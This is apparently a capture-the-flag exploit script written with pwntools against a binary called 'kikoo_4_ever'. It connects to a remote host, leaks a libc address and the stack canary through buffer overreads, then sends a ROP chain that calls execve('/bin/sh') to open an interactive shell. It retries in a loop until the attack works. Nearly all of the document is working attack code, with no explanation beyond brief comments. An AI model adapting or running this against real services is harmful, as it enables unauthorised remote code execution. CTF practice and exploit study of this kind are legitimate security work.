#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './kikoo_4_ever'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'

is_local = True
is_remote = False

flag_state = 1
f = open('log.txt', 'w')
i = 0

while flag_state != -1:
    host = sys.argv[1]
    port = sys.argv[2]

    p = remote(host, port)
    #p = process(local_file)
    libc = ELF(remote_libc)

    elf = ELF(local_file)

    context.log_level = 'debug'
    context.arch = elf.arch

    se      = lambda data               :p.send(data) 
    sa      = lambda delim,data         :p.sendafter(delim, data)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    sea     = lambda delim,data         :p.sendafter(delim, data)
    rc      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, '\0'))
    uu64    = lambda data               :u64(data.ljust(8, '\0'))
    info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

    def debug(cmd=''):
        if is_local: gdb.attach(p)

    sla('> ','J')
    sla('> ','2')
    sea('Rule n°6: ',cyclic(7*8))
    ru(cyclic(7*8))
    leak = uu64(rc(6))
    p.recvrepeat(1)
    p.sendline('n')

    libcbase = leak-0x94038
    info_addr('libcbase',libcbase)

    # gadget
    prdi = 0x000000000002155f + libcbase # pop rdi ; ret
    prsi = 0x0000000000023e6a + libcbase # pop rsi ; ret
    prdx = 0x0000000000001b96 + libcbase # pop rdx ; ret
    ret  = 0x00000000000008aa + libcbase # ret
    execve = libc.sym['execve'] + libcbase
    binsh = libc.search('/bin/sh').next() + libcbase
    #oneshot = 0x10a38c + libcbase
    #oneshot = 0x4f322 + libcbase

    ppr  = 0x0000000000103cca + libcbase # pop rcx ; pop rbx ; ret

    sea('Rule n°6: ',cyclic(521))
    p.recvuntil('wrote:\n')
    canary = u64(p.recv(528)[521:].rjust(8, '\x00'))
    info_addr('canary',canary)

    p.recvrepeat(1)
    p.sendline('n')

    payload = p64(0xdeadbeef)*39  # padding
    payload = p64(0)
    payload += p64(0xdeadbeef)*9
    payload+= p64(canary)         # 392 - canary 49
    #payload+= p64(binsh)*8          # ret to rop
    payload+= p64(ret)*8          # ret to rop
    payload+= p64(prdi) + p64(binsh) # 58
    payload+= p64(prsi) + p64(0)  # 61
    payload+= p64(prdx) + p64(0)  # 63
    payload+= p64(execve)         # 65
    payload+= p64(canary)         # 66
    sea('Rule n°6: ',payload)
    sla('Is it ok? Shall we move on? (y/n)','y')

    sl('9')

    flag_state = p.recvrepeat(1).find("terminated")
    if flag_state != -1:
        f.write('[{}] terminated...\n'.format(i))
        p.close()
        continue
    p.interactive()
    i += 1


